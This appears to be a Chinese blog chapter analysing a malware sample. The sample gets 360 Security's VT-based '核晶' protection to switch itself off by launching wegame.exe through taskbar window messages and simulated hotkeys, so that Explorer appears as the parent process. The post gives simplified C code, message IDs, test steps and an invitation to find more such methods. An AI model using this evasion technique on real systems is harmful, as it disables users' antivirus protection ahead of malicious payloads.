<p>在上一章节中，我们讲了一种古老却仍然有效的技术：BYOVD，它允许攻击者将存在漏洞的驱动程序加载到ring 0层，在同样的权限等级下对抗杀毒软件自己的驱动和清理掉内存中的回调函数结构。</p>
<p>这种攻击手法在最近几年迎来了爆发式增长，大名鼎鼎的银狐正是用这种手法瘫痪了大部分主流的杀毒软件和一些edr。</p>
<p>于是，为了对抗这种同一层级的威胁，杀毒软件选择使用Intel VT-x虚拟化技术把自己的代码放到了等级更高的ring -1虚拟化层，windows操作系统同样也实现了一套类似的保护手法（内核隔离）。</p>
<p><strong>是的，杀毒软件通过这样的方式获得了更高的对抗优先级，但在中国有个特殊情况。</strong></p>
<hr>
<h2 id="核心背景360的核晶技术" class="toc-header"><a class="toc-anchor" href="#核心背景360的核晶技术">¶</a> 核心背景：360的"核晶"技术</h2>
<h3 id="什么是核晶" class="toc-header"><a class="toc-anchor" href="#什么是核晶">¶</a> 什么是核晶？</h3>
<p>360有个安全组件叫"核晶"，它正是用了我们刚才提到的Intel VT-x虚拟化技术来保护系统：</p>
<pre class="prismjs line-numbers" v-pre="true"><code class="language-plaintext">正常情况：
你的程序 → 直接操作硬件

核晶开启后：
你的程序 → 核晶监控层 → 硬件
          ↑ 
      (基于VT-x虚拟化)
</code></pre>
<p><strong>简单说</strong>：核晶会在硬件层面监控你的操作，比如修改内核代码、注入其他进程等，都会被拦截。</p>
<hr>
<h3 id="问题来了游戏反外挂也用vt" class="toc-header"><a class="toc-anchor" href="#问题来了游戏反外挂也用vt">¶</a> 问题来了：游戏反外挂也用VT</h3>
<p>中国的网游（比如腾讯系游戏）有非常强势的反外挂系统，它们<strong>也用VT虚拟化技术</strong>。</p>
<pre class="prismjs line-numbers" v-pre="true"><code class="language-plaintext">冲突：
360核晶 → 占用VT
游戏反外挂 → 也要占用VT

结果：只有一个能跑！
</code></pre>
<p><strong>实际情况</strong>：如果游戏检测到360核晶占用了VT，会直接报错："请关闭虚拟化软件"。</p>
<hr>
<h2 id="h-360的妥协自动退出机制" class="toc-header"><a class="toc-anchor" href="#h-360的妥协自动退出机制">¶</a> 360的妥协：自动退出机制</h2>
<h3 id="国情决定的选择" class="toc-header"><a class="toc-anchor" href="#国情决定的选择">¶</a> 国情决定的选择</h3>
<p>360面临一个艰难选择：</p>
<ul>
<li><strong>不妥协</strong>：用户打不开游戏 → 用户卸载360 ❌</li>
<li><strong>妥协</strong>：检测到游戏启动时，核晶主动退出 ✅</li>
</ul>
<p><strong>360选了后者。</strong></p>
<p>当检测到特定游戏（比如WeGame相关游戏）启动时，核晶会进入"自适应状态"，实际上就是暂时关闭VT保护。</p>
<hr>
<h2 id="攻击者怎么利用这个" class="toc-header"><a class="toc-anchor" href="#攻击者怎么利用这个">¶</a> 攻击者怎么利用这个？</h2>
<h3 id="核心思路" class="toc-header"><a class="toc-anchor" href="#核心思路">¶</a> 核心思路</h3>
<p><img src="/%E8%99%9A%E6%8B%9F%E5%8C%96.jpg" alt="虚拟化.jpg"></p>
<pre class="prismjs line-numbers" v-pre="true"><code class="language-plaintext">正常情况：
运行恶意程序 → 核晶拦截 ✗

利用游戏进程：
启动游戏相关exe → 核晶退出 → 运行恶意程序 ✓
</code></pre>
<h3 id="实战案例分析" class="toc-header"><a class="toc-anchor" href="#实战案例分析">¶</a> 实战案例分析</h3>
<p>有人逆向了一个样本，发现了360的检测逻辑：</p>
<p><strong>样本做了什么？</strong></p>
<pre class="prismjs line-numbers" v-pre="true"><code class="language-plaintext">1. 释放 wegame.exe 到 C:\ProgramData\
2. 杀掉 qq.exe 进程（避免快捷键冲突）
3. 通过特殊方法启动 wegame.exe
4. 核晶检测到 wegame → 自动退出VT保护
5. 执行真正的恶意代码
6. 任务完成后，kill掉 wegame.exe
</code></pre>
<hr>
<h3 id="关键技术点绕过父进程检测" class="toc-header"><a class="toc-anchor" href="#关键技术点绕过父进程检测">¶</a> 关键技术点：绕过父进程检测</h3>
<p>360不傻，如果你直接用<code>CreateProcess</code>启动wegame.exe，它能检测到父进程是你的恶意程序：</p>
<pre class="prismjs line-numbers" v-pre="true"><code class="language-plaintext">恶意程序.exe
  └─ wegame.exe  ← 360检测：父进程可疑！拦截！
</code></pre>
<p><strong>样本的绕过方法</strong>：</p>
<pre class="prismjs line-numbers" v-pre="true"><code class="language-plaintext">1. 找到任务栏窗口（Shell_TrayWnd）
2. 向它发送特定消息
3. 注册一个快捷键（比如 Ctrl+Alt+A）
4. 模拟键盘按下快捷键
5. Explorer.exe 响应快捷键，启动 wegame.exe
</code></pre>
<p><strong>结果</strong>：</p>
<pre class="prismjs line-numbers" v-pre="true"><code class="language-plaintext">explorer.exe（系统进程）
  └─ wegame.exe  ← 360检测：父进程是explorer，正常启动！
</code></pre>
<hr>
<h3 id="代码逻辑简化版" class="toc-header"><a class="toc-anchor" href="#代码逻辑简化版">¶</a> 代码逻辑（简化版）</h3>
<p>样本的核心代码大致长这样：</p>
<pre class="prismjs line-numbers" v-pre="true"><code class="language-c">void BypassHeXing() {
    // 1. 释放游戏exe
    DropFile("C:\\ProgramData\\wegame.exe");
  
    // 2. 杀掉QQ（避免快捷键冲突）
    TerminateProcessByName("qq.exe");
  
    // 3. 找到任务栏窗口
    HWND hTray = FindWindow("Shell_TrayWnd", NULL);
  
    // 4. 发送特定消息（注册快捷键）
    for (int i = 0; i &lt; 10; i++) {
        PostMessage(hTray, 0x4EA, 0, 0);  // 360样本中的消息值
    }
  
    // 5. 模拟按下快捷键（触发explorer启动wegame）
    keybd_event(VK_CONTROL, 0, 0, 0);
    keybd_event(VK_MENU, 0, 0, 0);
    keybd_event('A', 0, 0, 0);
    keybd_event('A', 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0);
  
    Sleep(3000);  // 等待核晶退出
  
    // 6. 执行真正的恶意操作
    RunMaliciousPayload();
  
    // 7. 清理痕迹
    HWND hWeGame = FindWindow(NULL, "WeGame");
    SendMessage(hWeGame, WM_QUIT, 0, 0);
}
</code></pre>
<hr>
<h2 id="为什么这个方法有效" class="toc-header"><a class="toc-anchor" href="#为什么这个方法有效">¶</a> 为什么这个方法有效？</h2>
<h3 id="调用链分析" class="toc-header"><a class="toc-anchor" href="#调用链分析">¶</a> 调用链分析</h3>
<p>当你模拟快捷键后，Windows内部发生了这些事：</p>
<pre class="prismjs line-numbers" v-pre="true"><code class="language-plaintext">user32!CallWindowProcW  ← 处理快捷键
  └─ Explorer!CTray::v_WndProc  ← 任务栏窗口过程
      └─ Explorer!CTray::_HotkeySearchFailed  ← 快捷键处理
          └─ Explorer!_ExecItemByPidls  ← 执行快捷方式
              └─ shlwapi!SHInvokeDefaultCommand  ← 调用Shell执行
                  └─ SHELL32!CDefFolderMenu::InvokeCommand
                      └─ ntdll!NtCreateUserProcess  ← 创建进程
</code></pre>
<p><strong>关键点</strong>：</p>
<ul>
<li>整个调用链都是系统组件</li>
<li>父进程是<code>explorer.exe</code>（系统进程）</li>
<li>360无法判断这是恶意行为</li>
</ul>
<hr>
<h2 id="其他可利用的触发方式" class="toc-header"><a class="toc-anchor" href="#其他可利用的触发方式">¶</a> 其他可利用的触发方式</h2>
<p>除了快捷键，还可以通过以下消息触发：</p>
<pre class="prismjs line-numbers" v-pre="true"><code class="language-plaintext">0x4E6  → 注册快捷键
0x4E9  → 执行快捷键
0x4EA  → 触发特定操作
</code></pre>
<p>你可以用这些消息ID去探索更多的利用姿势。</p>
<hr>

<p><strong>测试步骤</strong>：</p>
<pre class="prismjs line-numbers" v-pre="true"><code class="language-plaintext">1. 安装360安全卫士，开启"核晶"防护
2. 运行上面的代码启动wegame.exe
3. 打开360主界面，查看"核晶"状态
 
结果：显示"自适应"状态（实际上已停用VT）

<h2 id="一点思考" class="toc-header"><a class="toc-anchor" href="#一点思考">¶</a> 一点思考</h2>
<h3 id="这个案例说明了什么" class="toc-header"><a class="toc-anchor" href="#这个案例说明了什么">¶</a> 这个案例说明了什么？</h3>
<pre class="prismjs line-numbers" v-pre="true"><code class="language-plaintext">✓ 安全软件必须考虑"用户体验"
✓ 强势的第三方（游戏厂商）可以倒逼安全软件妥协
